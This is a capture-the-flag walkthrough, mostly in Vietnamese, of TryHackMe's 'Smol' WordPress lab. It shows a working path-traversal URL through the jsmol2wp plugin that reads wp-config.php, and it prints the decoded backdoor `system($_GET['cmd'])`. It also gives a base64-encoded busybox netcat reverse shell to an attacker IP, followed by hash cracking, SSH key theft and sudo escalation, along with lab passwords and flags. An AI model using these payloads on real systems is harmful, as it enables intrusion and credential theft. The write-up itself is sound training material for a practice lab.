# TryHackMe-Smol

At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.

Quick Tips: Do you know that on computers without GPU like the AttackBox, John The Ripper is faster than Hashcat?



recon 

└─$ rustscan -a 10.201.126.90 -- -sV -sC

<img width="1062" height="344" alt="image" src="https://github.com/user-attachments/assets/935647a3-7556-4d9c-8af8-ab80f67b26e1" />

sudo nano /etc/hosts

10.201.126.90   www.smol.thm

đầu tiên là trang chính đã cho tôi 1 thông tin quan trọng là "Proudly powered by WordPress"

<img width="1241" height="794" alt="image" src="https://github.com/user-attachments/assets/ecfa5102-681a-4bba-8e57-8f12965849e0" />

Enumeration

<img width="756" height="473" alt="image" src="https://github.com/user-attachments/assets/f6c706ef-940b-400c-9c8a-6468d244814e" />

quét WordPress

└─$ wpscan --url http://www.smol.thm/ -e ap,vt --force --api-token $api    

-e ap,vt (tương đương --enumerate ap,vt)

Tham số -e bật enumeration — yêu cầu WPScan thu thập các thông tin cụ thể.

ap = all plugins — liệt kê tất cả plugin mà WPScan phát hiện trên site (danh sách plugin được dò đường dẫn/URL, file, v.v.). 

vt = vulnerable themes — kiểm tra theme đang dùng (hoặc tìm theme) và báo những theme được biết là có lỗ hổng trong cơ sở dữ liệu WPScan. (Lưu ý: khác với at = all themes — chỉ liệt kê theme, còn vt cố gắng tìm và báo theme có lỗ hổng)

--force

Ép chạy quét ngay cả khi WPScan không chắc đó là một site WordPress (hoặc khi bước phát hiện WordPress bị bỏ qua). Dùng khi site che dấu WP hoặc WPScan không auto-detect được nhưng bạn biết chắc đó là WordPress. Cẩn thận: có thể tạo ra nhiều false positives.

--api-token $api

WPScan có một API để tra cứu cơ sở dữ liệu lỗ hổng (wpscan.com). --api-token cung cấp token để WPScan gọi API đó và nhận kết quả chính xác hơn (bao gồm các lỗ hổng đã được xác minh). Nếu không có token, WPScan vẫn chạy nhưng một số kiểm tra/chi tiết lỗ hổng có thể bị giới hạn

<img width="1048" height="512" alt="image" src="https://github.com/user-attachments/assets/534933d8-3bfc-443d-9cbf-b9cdee550f2c" />

Plugin jsmol2wp (phiên bản 1.07) được phát hiện trên http://www.smol.thm/wp-content/plugins/jsmol2wp/.

WPScan báo 2 lỗ hổng nghiêm trọng, không cần xác thực (unauthenticated):

XSS (Cross-Site Scripting) — attacker có thể chèn/khởi chạy JavaScript trong trình duyệt của nạn nhân.

SSRF (Server-Side Request Forgery) — attacker có thể bắt plugin/giao thức server gửi yêu cầu HTTP tới bất kỳ URL nào (tới hệ mạng nội bộ, metadata service, v.v.).

Cả hai lỗ hổng đều có CVE: CVE-2018-20462 (XSS) và CVE-2018-20463 (SSRF)

tham khảo ở đây https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2018/CVE-2018-20463.yaml

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

<img width="863" height="834" alt="image" src="https://github.com/user-attachments/assets/e52000c9-a074-422e-a79d-ec771bdca064" />

username : wpuser

password : kbLSF2Vop#lw3rjDZ629*Z%G

và tôi đã có được trang quản trị

<img width="1241" height="819" alt="image" src="https://github.com/user-attachments/assets/3b8dd227-5d83-4ee0-92ae-daaa67a1b923" />

đây là trang mà tôi chú ý 

<img width="1325" height="704" alt="image" src="https://github.com/user-attachments/assets/83361c24-5eac-4f57-88eb-a1ad3b73031f" />

nhiệm vụ 1: [QUAN TRỌNG] Kiểm tra Backdoors: Xác minh MÃ NGUỒN của plugin "Hello Dolly" là bản sửa đổi mã của trang web

<img width="1331" height="786" alt="image" src="https://github.com/user-attachments/assets/070df7c4-1207-441a-8d62-38377a74c7b5" />

điều có có nghĩa là plugin "Hello Dolly" đã được cài đặt tôi đã kiểm tra và đúng vậy mã nguồn được lưu trữ trên tệp hello.php

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php

<img width="1092" height="828" alt="image" src="https://github.com/user-attachments/assets/53685229-86f6-4d75-984c-dd4c8bdb475f" />

tôi thử giải mã base64 bằng công cụ cyberchef 

<img width="1526" height="679" alt="image" src="https://github.com/user-attachments/assets/5e63dfcd-c954-4201-b6e3-9fe574fb94b3" />

khi hỏi chatgpt thì nó ra kết quả sau 

Các chuỗi như \143, \155, \x64 là escape sequences (octal / hex) tương ứng các ký tự ASCII:

\143 (octal) = decimal 99 = 'c'

\155 (octal) = decimal 109 = 'm'

\x64 (hex) = decimal 100 = 'd'

\x6d (hex) = decimal 109 = 'm'

\144 (octal) = decimal 100 = 'd'

kết quả là :

if (isset($_GET["cmd"])) { system($_GET["cmd"]); }

Mã này cho phép bất kỳ ai gửi ?cmd= và máy chủ sẽ chạy lệnh đó. Rất dễ bị chiếm quyền, exfiltrate dữ liệu, cài webshell, tạo user, v.v.

tôi sẽ thử ngay tại trang http://www.smol.thm/wp-admin/index.php

<img width="655" height="191" alt="image" src="https://github.com/user-attachments/assets/f6c387da-4353-4f4a-9bfb-27b8de69e80d" />

thành công và tôi chuẩn bị cho đưa shell về máy tôi 

ta cần mã hóa payload này ở dạng base64

<img width="1265" height="866" alt="image" src="https://github.com/user-attachments/assets/2ef03dec-5ce0-475a-bc4e-2d14f17fa50f" />

http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC4xNC4xMDguMjI2IDEyMzQgLWUgc2g= | base64 -d | bash

sau đó ở máy kali

nc -lnvp 1234

<img width="605" height="189" alt="image" src="https://github.com/user-attachments/assets/ce4a6167-1b79-4d56-bae4-57054350a0f4" />

đã có được shell nhưng tôi sẽ nâng cấp shell lên 

python3 -c 'import pty;pty.spawn("/bin/bash")'

<img width="1215" height="772" alt="image" src="https://github.com/user-attachments/assets/53be070b-2e50-41f5-bdb3-58b859735dd3" />

<img width="1317" height="781" alt="image" src="https://github.com/user-attachments/assets/a70d4c43-ba31-447f-bb34-a96d05904681" />

tôi dùng hashcat để bẻ khóa băm của diego 

hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt -O -w 3

<img width="891" height="644" alt="image" src="https://github.com/user-attachments/assets/da840e48-1386-4089-9501-3baf30b38377" />

đã có password 

<img width="506" height="178" alt="image" src="https://github.com/user-attachments/assets/8edf1318-5ce3-4394-92d7-d20b6d9915c8" />

cờ user : 45edaec653ff9ee06236b7ce72b86963

tôi vào thử người dùng think sau đó lấy id_rsa 

<img width="793" height="613" alt="image" src="https://github.com/user-attachments/assets/5d3766f6-efcd-42dc-bdb6-0b76bc97c47c" />

sau đó sử dụng nó để đăng nhập ssh 

<img width="921" height="649" alt="image" src="https://github.com/user-attachments/assets/c8aa1216-5a99-47f9-9e69-24d71270327c" />

sau đó tôi lấy file wordpress.old.zip về máy tôi 

<img width="1246" height="198" alt="image" src="https://github.com/user-attachments/assets/78089999-25bc-4dd8-870f-afc291956c9d" />

phát hiện ra file này unzip cần password 

sử dụng john 

zip2john wordpress.old.zip > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

<img width="834" height="196" alt="image" src="https://github.com/user-attachments/assets/7b931e0b-d762-48d1-81e9-dde89d6923c4" />

sau đó unzip 

<img width="1221" height="712" alt="image" src="https://github.com/user-attachments/assets/f259b9ff-0708-4a57-8931-c4c372d6864f" />

phát hiện ra trong file wp-config.php có password của tài khoản có tên là xavi 

P@ssw0rdxavi@

<img width="1096" height="636" alt="image" src="https://github.com/user-attachments/assets/79e83e8f-a65e-4dc3-a39f-3bc9ebdebbb1" />

tôi chuyển sang người dùng xavi bằng lệnh su xavi 

và với người dùng xavi ta có quyền sudo 

<img width="941" height="712" alt="image" src="https://github.com/user-attachments/assets/63a4c836-65d7-4669-8433-a321581153d2" />

cờ root : bf89ea3ea01992353aef1f576214d4e4
